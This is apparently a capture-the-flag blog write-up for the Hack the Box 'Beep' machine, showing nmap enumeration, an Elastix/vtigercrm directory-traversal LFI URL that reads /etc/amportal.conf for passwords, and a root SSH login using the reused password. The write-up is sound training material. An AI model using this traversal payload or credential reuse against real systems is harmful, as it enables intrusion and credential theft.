---
type: post
title: "Hack the Box Beep Write-up"
date: 2020-05-17 11:37:00 +1000
---
Continuing the "OSCP-like" boxes series with Beep from Hack the Box.

## Overview

![Beep information image](/assets/img/beep/beep-infocard.png){: .align-right}

Beep is another CVE based machine with multiple entry points. Some of which give instant root access and others which require some privilege escalation on the box.

Skills tested:

- Port scanning
- Service enumeration
- Vulnerability CVE identification
- Vulnerability exploitation
- Privilege escalation (optional)

## Scanning and Enumeration

Scanning this box with nmap `nmap -sC -sV -oA nmap/beep 10.10.10.7` finds a large number of ports open. Ports 80 and 443 are normally the best to begin enumerating but 10000 (webmin) is also potentially vulnerable and the other services may provide valuable for user enumeration or information leakage.

```text
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey:
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: RESP-CODES AUTH-RESP-CODE LOGIN-DELAY(0) EXPIRE(NEVER) STLS USER APOP UIDL PIPELINING IMPLEMENTATION(Cyrus POP3 server v2) TOP
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: IMAP4 Completed OK LISTEXT X-NETSCAPE BINARY UIDPLUS URLAUTHA0001 RIGHTS=kxte CONDSTORE ACL IMAP4rev1 NAMESPACE STARTTLS NO IDLE ANNOTATEMORE RENAME CHILDREN SORT MULTIAPPEND CATENATE THREAD=REFERENCES THREAD=ORDEREDSUBJECT MAILBOX-REFERRALS SORT=MODSEQ UNSELECT LIST-SUBSCRIBED ATOMIC LITERAL+ ID QUOTA
443/tcp   open  ssl/https?
|_ssl-date: 2020-05-12T14:14:57+00:00; +1m20s from scanner time.
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-server-header: MiniServ/1.570
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com
```

## Port 80 and 443

![Beep http login page](/assets/img/beep/beep-port80-login.png){: .align-right}

Browsing to port 80 redirects to port 443 and displays the login page for "Elastix" as seen on the right. This leads us to a exploit-db.com and a possible local file inclusion (LFI) exploit that appears simple of execute.

The [Elastix exploit](https://www.exploit-db.com/exploits/37637) is relatively straightforward to perform. The directory traversal and LFI allow for the reading of a sensitive configuration file and some password reuse allows us to directly login as root via SSH.

## Elastix LFI

Browsing to `https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action` presents us with the contents of amportal.conf and some sensitive passwords.

![Beep LFI](/assets/img/beep/beep-elastix-lfi.png){: .align-center}

Using SSH we can try that password as root. You may run into a protocol negotiation error but we can get around that by specifying the protocols directly as shown below.

`ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc root@10.10.10.7`

Once we login with the exposed password we have full access to the box and can grab both the user.txt and root.txt flags!

## Optional Extras

There are a number of other ways to own this box as shown in [IppSec's YouTube walkthough](https://www.youtube.com/watch?v=XJmBpOd__N8) of beep.

- A FreePBX exploit
- Webmin shellshock exploit

Enjoy!
